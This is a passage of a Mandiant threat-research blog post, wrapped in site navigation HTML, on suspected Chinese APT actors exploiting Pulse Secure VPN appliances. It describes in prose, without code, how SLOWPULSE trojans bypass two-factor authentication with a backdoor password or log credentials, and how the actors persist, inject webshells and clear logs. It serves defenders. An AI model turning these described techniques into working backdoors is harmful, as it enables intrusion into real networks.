<li itemprop="url"><a href="/products/endpoint-security.html" itemprop="name" class="MegaMenus">Endpoint Security</a></li>
<li itemprop="url"><a href="/products/email-security.html" itemprop="name" class="MegaMenus">Email Security</a></li>
<li itemprop="url"><a href="/products/cloudvisory.html" itemprop="name" class="MegaMenus">Cloudvisory</a></li>
<li itemprop="url"><a href="/products/detection-on-demand.html" itemprop="name" class="MegaMenus">Detection On Demand</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Security For:</h4><ul><li itemprop="url"><a href="/products/cloud-security.html" itemprop="name" class="MegaMenus">Cloud</a></li>
<li itemprop="url"><a href="/products/financial-services.html" itemprop="name" class="MegaMenus">Financial Services</a></li>
<li itemprop="url"><a href="/products/government.html" itemprop="name" class="MegaMenus">Government</a></li>
<li itemprop="url"><a href="/products/healthcare.html" itemprop="name" class="MegaMenus">Healthcare</a></li>
<li itemprop="url"><a href="/products/industrial-systems-and-critical-infrastructure-security.html" itemprop="name" class="MegaMenus">Critical Infrastructure</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  @media (max-width: 1024px) {
    .megamenu-tab .parsys .megamenus .megamenu-cta {
      display: none;
    }
  }
  .content-0-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-customers.jpg) center no-repeat;
    background-size: cover;
    border-radius: 60px 0 0 60px;
    border: 0 solid #ffffff;
  }
  .content-0-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}
</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>Customer Stories</h5>
<p>Explore some of the companies who are succeeding with&nbsp;FireEye.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-2E5799 compact" href="/customers.html" id="learn-more-intel">Read the Stories</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
<div class="view-all-bar">
<a href="/products.html" class="MegaMenus">
VIEW ALL PRODUCTS</a>
</div></div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/mandiant.html">
<h4 class="megamenu-title">
<a href="/mandiant.html" itemprop="url" class="MegaMenus">Mandiant Solutions</a>
</h4>
<div class="content-1-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<ul><li itemprop="url"><a href="/mandiant/threat-intelligence.html" itemprop="name" class="MegaMenus">Threat Intelligence</a></li>
<li itemprop="url"><a href="/mandiant/security-validation.html" itemprop="name" class="MegaMenus">Security Validation</a></li>
<li itemprop="url"><a href="/mandiant/managed-detection-and-response.html" itemprop="name" class="MegaMenus">Managed Defense</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<ul><li itemprop="url"><a href="/mandiant/incident-response.html" itemprop="name" class="MegaMenus">Incident Response</a></li>
<li itemprop="url"><a href="/mandiant/cyber-security-consulting.html" itemprop="name" class="MegaMenus">Cyber Security Consulting</a></li>
<li itemprop="url"><a href="/mandiant/expertise-on-demand.html" itemprop="name" class="MegaMenus">Expertise On Demand</a></li>
<li itemprop="url"><a href="/services/training.html" itemprop="name" class="MegaMenus">Cyber Security Training</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  .content-1-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-mandiant.jpg) center no-repeat;
    background-size: cover;
    background-position: bottom;
    border-radius: 60px 0 0 60px;
    border: 0 solid #ffffff;}
  .content-1-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}

</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>Mandiant Advantage</h5>
<p>The new standard in threat intelligence.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-B2282D expand" href="/mandiant/advantage.html">Learn More</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
<div class="view-all-bar">
<a href="/mandiant.html" class="MegaMenus">
VIEW ALL Mandiant Solutions</a>
</div></div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/customers.html">
<h4 class="megamenu-title">
<a href="/company/customers.html" itemprop="url" class="MegaMenus">Customers</a>
</h4>
<div class="content-2-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Customers</h4><ul><li itemprop="url"><a href="/customers.html" itemprop="name" class="MegaMenus">Customer Stories</a></li>
<li itemprop="url"><a href="/company/customers.html" itemprop="name" class="MegaMenus">Customer Success</a></li>
<li itemprop="url"><a href="https://fireeyecommunity.force.com/CustomerCommunity/s/" target="_blank" itemprop="name" class="MegaMenus">Customer Portal</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Get Support</h4><ul><li itemprop="url"><a href="/support/contacts.html" itemprop="name" class="MegaMenus">Contact Support</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Find Answers</h4><ul><li itemprop="url"><a href="/support/programs.html" itemprop="name" class="MegaMenus">Support Programs</a></li>
<li itemprop="url"><a href="/support/notices.html" itemprop="name" class="MegaMenus">Support Notices</a></li>
<li itemprop="url"><a href="/support/products.html" itemprop="name" class="MegaMenus">Supported Products</a></li>
<li itemprop="url"><a href="https://community.fireeye.com/s/support-community" target="_blank" itemprop="name" class="MegaMenus">Communities</a></li>
<li itemprop="url"><a href="https://docs.fireeye.com" target="_blank" itemprop="name" class="MegaMenus">Documentation Portal</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  .content-2-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-support.jpg) center no-repeat;
    background-size: cover;
    border-radius: 60px 0 12px 60px;
    border: 0 solid #ffffff;}
  .content-2-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}

</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>Support</h5>
<p>A global network of support experts available 24x7. We offer simple and flexible support programs to maximize the value of your FireEye products and services.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-2E5799 compact" href="/support.html">Get Support</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
</div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/partners.html">
<h4 class="megamenu-title">
<a href="/partners.html" itemprop="url" class="MegaMenus">Partners</a>
</h4>
<div class="content-3-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">FireEye Partners</h4><ul><li itemprop="url"><a href="/partners.html" itemprop="name" class="MegaMenus">Partners Overview</a></li>
<li itemprop="url"><a href="/partners/resellers.html" itemprop="name" class="MegaMenus">FireEye Affinity Resellers</a></li>
<li itemprop="url"><a href="/partners/strategic-technology-partners.html" itemprop="name" class="MegaMenus">Technology Partners</a></li>
<li itemprop="url"><a href="/partners/strategic-technology-partners/cyber-risk-insurance.html" itemprop="name" class="MegaMenus">Cyber Risk Partners</a></li>
<li itemprop="url"><a href="/partners/global-solution-providers.html" itemprop="name" class="MegaMenus">Global Solution Providers</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Partner Resources</h4><ul><li itemprop="url"><a href="https://partners.fireeye.com/directory/" target="_blank" itemprop="name" class="MegaMenus">Partner Locator</a></li>
<li itemprop="url"><a href="http://training.fireeye.com/" target="_blank" itemprop="name" class="MegaMenus">Partner Education Center</a></li>
<li itemprop="url"><a href="/support.html" itemprop="name" class="MegaMenus">Support</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Partnering with FireEye</h4><ul><li itemprop="url"><a href="https://www2.fireeye.com/Partner-Request-LP-New.html" target="_blank" itemprop="name" class="MegaMenus">Become a Partner</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  .content-3-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-partners.jpg) center no-repeat;
    background-size: cover;
    border-radius: 60px 0 12px 60px;
    border: 0 solid #ffffff;}
  .content-3-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}

</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>Partner Portal</h5>
<p>Access for our registered Partners to help you be successful with FireEye.
Collateral, deal registration, request for funds, training, enablement, and more.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-F99B1C compact mm-cta" href="https://partners.fireeye.com/" target="_blank">Partner Portal</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
</div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/current-threats.html">
<h4 class="megamenu-title">
<a href="/current-threats.html" itemprop="url" class="MegaMenus">Resources</a>
</h4>
<div class="content-4-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub " id="mandiant-mega-menu">
<div class="n03-sub_container" data-columns="3">
<div class="n03-sub_table">
 <div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Intelligence Briefings and Bulletins</h4><ul><li itemprop="url"><a href="/current-threats/annual-threat-report.html" itemprop="name" class="MegaMenus">Annual Threat Reports</a></li>
<li itemprop="url"><a href="/current-threats/threat-intelligence-reports.html" itemprop="name" class="MegaMenus">Threat Intelligence Reports</a></li>
<li itemprop="url"><a href="/current-threats/reports-by-industry.html" itemprop="name" class="MegaMenus">Threat Intelligence Reports by Industry</a></li>
<li itemprop="url"><a href="/current-threats/apt-groups.html" itemprop="name" class="MegaMenus">APT Groups</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">FireEye Blogs</h4><ul><li itemprop="url"><a href="/blog.html" itemprop="name" class="MegaMenus">Read the FireEye Blogs</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Cyber Security</h4><ul><li itemprop="url"><a href="/current-threats/what-is-cyber-security.html" itemprop="name" class="MegaMenus">What is Cyber Security?</a></li>
<li itemprop="url"><a href="/campaigns/clarity-in-the-cloud.html" itemprop="name" class="MegaMenus">Clarity in the Cloud</a></li>
<li itemprop="url"><a href="/campaigns/security-effectiveness.html" itemprop="name" class="MegaMenus">Security Effectiveness and Validation</a></li>
<li itemprop="url"><a href="https://vision.fireeye.com" target="_blank" itemprop="name" class="MegaMenus">The Vision â€“ Digital Magazine</a></li>
<li itemprop="url"><a href="/company/webinars.html" itemprop="name" class="MegaMenus">Webinars</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Free Tools & Apps</h4><ul><li itemprop="url"><a href="/services/freeware.html" itemprop="name" class="MegaMenus">Free Software Downloads</a></li>
<li itemprop="url"><a href="https://fireeye.market" target="_blank" itemprop="name" class="MegaMenus">FireEye Market</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Training</h4><ul><li itemprop="url"><a href="/services/training.html" itemprop="name" class="MegaMenus">Education and Training</a></li>
</ul></div>
</div>
</div><div class="separator disabled"></div></div></div>
</div>
<div class="view-all-bar">
<a href="/current-threats.html" class="MegaMenus">
VIEW ALL RESOURCES</a>
</div></div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/company.html">
<h4 class="megamenu-title">
<a href="/company.html" itemprop="url" class="MegaMenus">Company</a>
</h4>
<div class="content-5-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">About Us</h4><ul><li itemprop="url"><a href="/company.html" itemprop="name" class="MegaMenus">Why FireEye?</a></li>
<li itemprop="url"><a href="/company/awards.html" itemprop="name" class="MegaMenus">Awards and Honors</a></li>
<li itemprop="url"><a href="/company/leadership.html" itemprop="name" class="MegaMenus">Leadership</a></li>
<li itemprop="url"><a href="/company/board-of-directors.html" itemprop="name" class="MegaMenus">Board of Directors</a></li>
<li itemprop="url"><a href="http://investors.fireeye.com" target="_blank" itemprop="name" class="MegaMenus">Investor Relations</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Contact</h4><ul><li itemprop="url"><a href="/company/contact-us.html" itemprop="name" class="MegaMenus">Contact FireEye</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>.g04 .megamenu-list a{padding-right:38px;line-height:1.358;padding-bottom:2px}@media (min-width:60em){.g04 .n03-sub_container{padding-bottom:23px}}@media(min-width:64em) and (max-width:64.5em){.g04 .megamenu-tab:first-child .megamenu-title{padding-left:14px}}@media (min-width:68em) and (max-width:69em){.g04 .megamenu-tab:first-child .megamenu-title{padding-left:30px}}</style></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">News and Events</h4><ul><li itemprop="url"><a href="/company/newsroom.html" itemprop="name" class="MegaMenus">Newsroom</a></li>
<li itemprop="url"><a href="/company/press-releases.html" itemprop="name" class="MegaMenus">Press Releases</a></li>
<li itemprop="url"><a href="/company/events.html" itemprop="name" class="MegaMenus">Events</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Careers</h4><ul><li itemprop="url"><a href="/company/jobs.html" itemprop="name" class="MegaMenus">Job Opportunities</a></li>
<li itemprop="url"><a href="/company/jobs/internships.html" itemprop="name" class="MegaMenus">Internships</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  .content-5-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-vision.jpg) center no-repeat;
    background-size: cover;
    border-radius: 60px 0 12px 60px;
    border: 0 solid #ffffff;}
  .content-5-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}

</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>The Vision</h5>
<p>Read our digital magazine providing expert-authored stories, information, unique insights, and advice on cyber security.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-B2282D compact" href="https://vision.fireeye.com/" target="_blank">Get Your Copy</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
</div>
</div>
</div>
</li></ul>
</nav>
</div>
<span class="burger ficon ficon-menu"></span>
</header>
</div>
</div>


<div id="cookie-privacy-banner" style="display:none;">
<div class="l_container">
<div class="g">
<div class="g-u-1">
<div class="g-content">
<div class="cookie-banner">
<p class="cookie-text">
To give you the best possible experience, this site uses cookies.&nbsp; Find out more on <a href='/company/privacy.html' target='_blank'>how we use cookies</a>.<button type="button" class="cookie-button highlighted" onclick='javascript:onAccept();'>Accept</button>
</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="breadcrumbs breadcrumb">
<div class="l_container is-full">
<div class="g02 g02v0" id="g02-breadcrumbs">
<div class="g02_container">
<div class="g02_content">
<ul class="list-inline g02_list" itemscope itemtype="http://schema.org/BreadcrumbList">
<li class="g02_list_item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="BreadCrumb" href="/"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /></li>
<li class="g02_list_item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="BreadCrumb" href="/blog.html"><span itemprop="name">FireEye Blogs</span></a><meta itemprop="position" content="2" /></li>
<li class="g02_list_item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="BreadCrumb" href="/blog/threat-research.html"><span itemprop="name">Threat Research</span></a><meta itemprop="position" content="3" /></li>
<li class="g02_list_item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">Check Your Pulse: Suspected APT Actors Leverage Au...<meta itemprop="position" content="6" /></span>
</ul>
</div>
</div>
</div>
</div>
</div>
<main class="l_main" role="main">
<div class="l_container">
<div class="g g-alt ">
<div class="g-u-17-24 l_g-u-1">
<div class="g-content">
<div class="blog main"><div itemscope itemtype="http://schema.org/BlogPosting">
<div class="summary entrytextteaser">
</div>
<div class="title entrytitle">
<h2 class="category-name">Threat Research</h2>
<h1 class="blogpostlanding red" itemprop="headline">Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass
Techniques and Pulse Secure Zero-Day</h1>
<div class="c00 c00v0 entry-meta-block selfClear">
<time class="entry-date" itemprop="datePublished" content="2021-04-20T14:00:00Z">April 20, 2021</time>
<span class="sep"> | </span>
<span class="by-author" itemscope itemptype="http://schema.org/Person">by <a href="/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/dan-perez" title="View all entries filed under 'Fireeye - Authors : Dan Perez'">Dan Perez</a>, <a href="/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/sarah-jones" title="View all entries filed under 'Fireeye - Authors : Sarah Jones'">Sarah Jones</a>, <a href="/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/greg-wood" title="View all entries filed under 'Fireeye - Authors : Greg Wood'">Greg Wood</a>, <a href="/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/stephen-eckels" title="View all entries filed under 'Fireeye - Authors : Stephen Eckels'">Stephen Eckels</a><meta itemprop="author" content="Dan Perez" /><meta itemprop="contributor" content="Sarah Jones" /><meta itemprop="contributor" content="Greg Wood" /><meta itemprop="contributor" content="Stephen Eckels" /></span>
<div class="tags-section">
<a class="tagList" href="/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/vulnerabilities"> <span class="tagbutton">vulnerabilities</span></a><br class="on-mobile" />
<a class="tagList" href="/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/malware"> <span class="tagbutton">Malware</span></a><br class="on-mobile" />
<a class="tagList" href="/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/TTPs"> <span class="tagbutton">TTPs</span></a><br class="on-mobile" />
<a class="tagList" href="/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/persistence"> <span class="tagbutton">persistence</span></a><br class="on-mobile" />
<a class="tagList" href="/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/bypass"> <span class="tagbutton">bypass</span></a><br class="on-mobile" />
</div>
</div>
</div>
<div class="par parsys"><div class="entrytext section"><div class="c00 c00v0" itemprop="articleBody">
<h4>Executive Summary</h4>
<ul>
<li>Mandiant recently responded to multiple security incidents involving compromises of Pulse Secure VPN appliances.</li>
<li>This blog post examines multiple, related techniques for bypassing single and multifactor authentication on Pulse Secure VPN devices, persisting across upgrades, and maintaining access through webshells.</li>
<li>The investigation by Pulse Secure has determined that a combination of prior vulnerabilities and a previously unknown vulnerability discovered in April 2021, <a adhocenable="false" href="https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784/">CVE-2021-22893</a>, are responsible for the initial infection vector.</li>
<li>Pulse Secureâ€™s parent company, Ivanti, released mitigations for a vulnerability exploited in relation to these malware families and the <a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755">Pulse Connect Secure Integrity Tool</a> for their customers to determine if their systems are impacted. A final patch to address the vulnerability will be available in early May 2021.</li>
<li>Pulse Secure has been working closely with Mandiant, affected customers, government partners, and other forensic experts to address these issues.</li>
<li>There is no indication the identified backdoors were introduced through a supply chain compromise of the companyâ€™s network or software deployment process.</li>
</ul>
<h4>Introduction</h4>
<p>Mandiant is currently tracking 12 malware families associated with the exploitation of Pulse Secure VPN devices. These families are related to the circumvention of authentication and backdoor access to these devices, but they are not necessarily related to each other and have been observed in separate investigations. It is likely that multiple actors are responsible for the creation and deployment of these various code families.</p>
<p>The focus of this report is on the activities of UNC2630 against U.S. Defense Industrial base (DIB) networks, but detailed malware analysis and detection methods for all samples observed at U.S. and European victim organizations are provided in the technical annex to assist network defenders in identifying a large range of malicious activity on affected appliances. Analysis is ongoing to determine the extent of the activity.</p>
<p>Mandiant continues to collaborate with the Ivanti and Pulse Secure teams, Microsoft Threat Intelligence Center (MSTIC), and relevant government and law enforcement agencies to investigate the threat, as well as develop recommendations and mitigations for affected Pulse Secure VPN appliance owners.</p>
<p>As part of their investigation, Ivanti has released mitigations for a vulnerability exploited in relation to this campaign as well as the <a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755">Pulse Connect Secure Integrity Tool</a> to assist with determining if systems have been impacted.</p>
<h4>Details</h4>
<p>Early this year, Mandiant investigated multiple intrusions at defense, government, and financial organizations around the world. In each intrusion, the earliest evidence of attacker activity traced back to DHCP IP address ranges belonging to Pulse Secure VPN appliances in the affected environment.</p>
<p>In many cases, we were not able to determine how actors obtained administrator-level access to the appliances. However, based on analysis by Ivanti, we suspect some intrusions were due to the exploitation of previously disclosed Pulse Secure vulnerabilities from 2019 and 2020 while other intrusions were due to the exploitation of <a adhocenable="false" href="https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784/">CVE-2021-22893</a>.</p>
<p>We observed UNC2630 harvesting credentials from various Pulse Secure VPN login flows, which ultimately allowed the actor to use legitimate account credentials to move laterally into the affected environments. In order to maintain persistence to the compromised networks, the actor utilized legitimate, but modified, Pulse Secure binaries and scripts on the VPN appliance. This was done to accomplish the following:</p>
<ol>
<li>Trojanize shared objects with malicious code to log credentials and bypass authentication flows, including multifactor authentication requirements. We track these trojanized assemblies as SLOWPULSE and its variants.</li>
<li>Inject webshells we currently track as RADIALPULSE and PULSECHECK into legitimate Internet-accessible Pulse Secure VPN appliance administrative web pages for the devices.</li>
<li>Toggle the filesystem between Read-Only and Read-Write modes to allow for file modification on a typically Read-Only filesystem.</li>
<li>Maintain persistence across VPN appliance general upgrades that are performed by the administrator.</li>
<li>Unpatch modified files and delete utilities and scripts after use to evade detection.</li>
<li>Clear relevant log files utilizing a utility tracked as THINBLOOD based on an actor defined regular expression.</li>
</ol>
<p>In a separate incident in March 2021, we observed UNC2717 using RADIALPULSE, PULSEJUMP, and HARDPULSE at a European organization. Although we did not observe PULSEJUMP or HARDPULSE used by UNC2630 against U.S. DIB companies, these malware families have shared characteristics and serve similar purposes to other code families used by UNC2630. We also observed an OpenSSL library file modified in similar fashion as the other trojanized shared objects. We believe that the modified library file, which weâ€™ve named LOCKPICK, could weaken encryption for communications used by the appliance, but do not have enough evidence to confirm this.</p>
<p>Due to a lack of context and forensic evidence at this time, Mandiant cannot associate all the code families described in this report to UNC2630 or UNC2717. We also note the possibility that one or more related groups is responsible for the development and dissemination of these different tools across loosely connected APT actors. It is likely that additional groups beyond UNC2630 and UNC2717 have adopted one or more of these tools. Despite these gaps in our understanding, we included detailed analysis, detection techniques, and mitigations for all code families in the Technical Annex.</p>
<h4>SLOWPULSE</h4>
<p>During our investigation into the activities of UNC2630, we uncovered a novel malware family we labeled SLOWPULSE. This malware and its variants are applied as modifications to legitimate Pulse Secure files to bypass or log credentials in the authentication flows that exist within the legitimate Pulse Secure shared object <span class="code">libdsplibs.so</span>. Three of the four discovered variants enable the attacker to bypass two-factor authentication. A brief overview of these variants is covered in this section, refer to the Technical Annex for more details.</p>
<h5>SLOWPULSE Variant 1<i></i></h5>
<p>This variant is responsible for bypassing LDAP and RADIUS-2FA authentication routines if a secret backdoor password is provided by the attacker. The sample inspects login credentials used at the start of each protocolâ€™s associated routine and strategically forces execution down the successful authentication patch if the provided password matches the attacker's chosen backdoor password.</p>
<p><i>LDAP Auth Bypass</i></p>
<p>The routine <span class="code">DSAuth::LDAPAuthServer::authenticate</span> begins the LDAP authentication procedure. This variant inserts a check against the backdoor password after the bind routine so that the return value can be conditionally stomped to spoof successful authentication.</p>
<p><img src="/content/dam/fireeye-www/blog/images/pulse-secure/fig1.png" alt=""><br>
<span class="type-XS">Figure 1: LDAP Auth Bypass</span></p>
<p><i>RADIUS Two Factor Auth Bypass</i></p>
<p>The routine <span class="code">DSAuth::RadiusAuthServer::checkUsernamePassword</span> begins the RADIUS-2FA authentication procedure. This variant inserts checks against the backdoor password after the RADIUS authentication packet is received back from the authentication server. If the backdoor password is provided by the attacker, the packet type and successful authentication status flags are overwritten to spoof successful authentication.</p>
<p><img src="/content/dam/fireeye-www/blog/images/pulse-secure/fig2a.png" alt=""><span class="type-XS"><br>
Figure 2: Radius-2FA Bypass</span></p>
<h5>SLOWPULSE Variant 2</h5>
<p><i>ACE Two Factor Auth Credential Logging</i></p>
<p>This variant logs credentials used during the ACE-2FA authentication procedure <span class="code">DSAuth::AceAuthServer::checkUsernamePassword</span>. Rather than bypassing authentication, this variant logs the username and password to a file for later use by the attacker.</p>
<p><img src="/content/dam/fireeye-www/blog/images/pulse-secure/fig3.png" alt=""><br>
<span class="type-XS">Figure 3: ACE Auth Credential Log</span></p>
<h5>SLOWPULSE Variant 3</h5>
<p><i>ACE Two Factor Auth Bypass</i></p>
<p>This variant is responsible for bypassing the ACE-2FA logon procedure starting with <span class="code">DSAuth::AceAuthServer::checkUsernamePassword</span>. The flow of the authentication procedure is modified to bypass the routine responsible for verifying the username and password if the backdoor password is provided. With this modification the attacker can spoof successful authentication.</p>
<p><img src="/content/dam/fireeye-www/blog/images/pulse-secure/fig4.png" alt=""><br>
<span class="type-XS">Figure 4: ACE Auth Bypass Variant</span></p>
<h5>SLOWPULSE Variant 4</h5>
<p><i>RealmSignin Two Factor Auth Bypass</i></p>
<p>This variant bypasses the <span class="code">RealmSignin::runSecondaryAuth</span> procedure of the Pulse Secure VPN. The inserted logic modifies the execution flow of a specific step of the login process to spoof successful authentication. We believe that this may be a two-factor authentication bypass.</p>
<p><img src="/content/dam/fireeye-www/blog/images/pulse-secure/fig5.png" alt=""><br>
<span class="type-XS">Figure 5: RealmSignIn 2FA Auth Bypass</span></p>
<h4>Attribution</h4>
<p>We are in the early stages of gathering evidence and making attribution assessments and there are a number of gaps in our understanding of UNC2630, UNC2717, and these 12 code families. Nevertheless, the Mandiant and Ivanti teams are proactively releasing this analysis to assist network defenders in triaging and identifying malicious activity on affected appliances.</p>
<p>Mandiant is able to assess that:</p>
<ul>
<li>UNC2630 targeted U.S. DIB companies with SLOWPULSE, RADIALPULSE, THINBLOOD, ATRIUM, PACEMAKER, SLIGHTPULSE, and PULSECHECK as early as August 2020 until March 2021.<ul>
<li>We suspect UNC2630 operates on behalf of the Chinese government and may have ties to APT5</li>
</ul>
</li>
<li>UNC2717 targeted global government agencies between October 2020 and March 2021 using HARDPULSE, QUIETPULSE, AND PULSEJUMP.<ul>
<li>We do not have enough evidence about UNC2717 to determine government sponsorship or suspected affiliation with any known APT group.</li>
</ul>
</li>
<li>We do not have enough information about the use of LOCKPICK to make an attribution statement.</li>
</ul>
<h5>UNC2630</h5>
<p>UNC2630â€™s combination of infrastructure, tools, and on-network behavior appear to be unique, and we have not observed them during any other campaigns or at any other engagement. Despite these new tools and infrastructure, Mandiant analysts noted strong similarities to historic intrusions dating back to 2014 and 2015 and conducted by Chinese espionage actor APT5. We have also uncovered limited evidence to suggest that UNC2630 operates on behalf of the Chinese government. Analysis is still ongoing to determine the full scope of the activity that maybe related to the group.</p>
<p>Although we are not able to definitively connect UNC2630 to APT5, or any other existing APT group, a trusted third party has uncovered evidence connecting this activity to historic campaigns which Mandiant tracks as Chinese espionage actor APT5. While we cannot make the same connections, the third party assessment is consistent with our understanding of APT5 and their historic TTPs and targets.</p>
<p>APT5 has shown significant interest in compromising networking devices and manipulating the underlying software which supports these appliances. They have also consistently targeted defense and technology companies in the U.S., Europe, and Asia.</p>
<ul>
<li>As early as 2014, Mandiant Incident Response discovered APT5 making unauthorized code modifications to files in the embedded operating system of another technology platform.</li>
<li>In 2015, APT5 compromised a U.S. telecommunications organization providing services and technologies for private and government entities. During this intrusion, the actors downloaded and modified some of the router images related to the companyâ€™s network routers.</li>
<li>Also during this time, APT5 stole files related to military technology from a South Asian defense organization. Observed filenames suggest the actors were interested in product specifications, emails concerning technical products, procurement bids and proposals, and documents on unmanned aerial vehicles (UAVs).</li>
<li>APT5 persistently targets high value corporate networks and often re-compromises networks over many years. Their primary targets appear to be aerospace and defense companies located in the U.S., Europe, and Asia. Secondary targets (used to facilitate access to their primary targets) include network appliance manufacturers and software companies usually located in the U.S.</li>
</ul>
<h4>Recommendations</h4>
